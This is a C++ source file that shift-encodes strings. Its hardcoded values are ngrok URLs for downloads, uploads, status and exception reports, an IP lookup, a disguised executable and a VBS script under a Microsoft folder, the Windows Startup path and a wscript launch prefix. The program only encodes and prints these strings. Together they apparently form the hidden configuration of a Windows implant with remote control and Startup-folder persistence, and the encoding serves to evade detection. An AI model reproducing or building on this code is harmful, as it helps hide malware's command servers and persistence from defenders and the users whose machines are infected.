#include <iostream>
#include <string>

std::string obfuscateString(const std::string& input, int shift) {
    std::string obfuscated = input;
    for (char& c : obfuscated) {
        c = (c + shift) % 256; // Wrap around within extended ASCII range
    }
    return obfuscated;
}

std::string deobfuscateString(const std::string& input, int shift) {
    std::string deobfuscated = input;
    for (char& c : deobfuscated) {
        c = (c - shift + 256) % 256; // Wrap around and ensure positive
    }
    return deobfuscated;
}

int main() {
     std::string WEB_URL = "https://robust-ocelot-moderately.ngrok-free.app/api/parameters";
     std::string DOWN_LOAD_URL= "https://robust-ocelot-moderately.ngrok-free.app/download";
     std::string BRANCH_INFO_URL= "https://robust-ocelot-moderately.ngrok-free.app/web";
     std::string ERROR_REPORT_URL= "https://robust-ocelot-moderately.ngrok-free.app/reportexception";
     std::string UPLOAD_FILE_URL= "https://robust-ocelot-moderately.ngrok-free.app/upload";
     std::string OPERATION_STATUS_URL= "https://robust-ocelot-moderately.ngrok-free.app/status";
     std::string LOG_FILE_PATH = "C:\\MSPS\\MSPS.dll";
     std::string CONFIG_FILE_PATH = "C:\\MSPS\\config.json";
     std::string ip = "https://api.ipify.org";
     std::string vbs = "\\Microsoft\\Intermediate\\dataprocess.exe";
     std::string scut = "\\Microsoft\\Intermediate\\diff.vbs";
     std::string strStartPath = "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
     std::string vbscriptPath = "wscript.exe \"";

    int shift = 3; // Example shift value

    std::string obfuscated1 = obfuscateString(WEB_URL, shift);
    std::string obfuscated2 = obfuscateString(DOWN_LOAD_URL, shift);
    std::string obfuscated3 = obfuscateString(BRANCH_INFO_URL, shift);
    std::string obfuscated4 = obfuscateString(ERROR_REPORT_URL, shift);
    std::string obfuscated5 = obfuscateString(UPLOAD_FILE_URL, shift);
    std::string obfuscated6 = obfuscateString(OPERATION_STATUS_URL, shift);
    std::string obfuscated7 = obfuscateString(LOG_FILE_PATH, shift);
    std::string obfuscated8 = obfuscateString(CONFIG_FILE_PATH, shift);
    std::string obfuscated9 = obfuscateString(ip, shift);
    std::string obfuscated10 = obfuscateString(vbs, shift);
    std::string obfuscated11 = obfuscateString(scut, shift);
    std::string obfuscated12 = obfuscateString(strStartPath, shift);
    std::string obfuscated13 = obfuscateString(vbscriptPath, shift);
    
    
    //std::cout << "Original: " << original << std::endl;
    std::cout << "Obfuscated: " << obfuscated1 << std::endl;

    std::string deobfuscated = deobfuscateString(obfuscated1, shift);
    std::cout << "Deobfuscated: " << deobfuscated << std::endl;

    return 0;
}
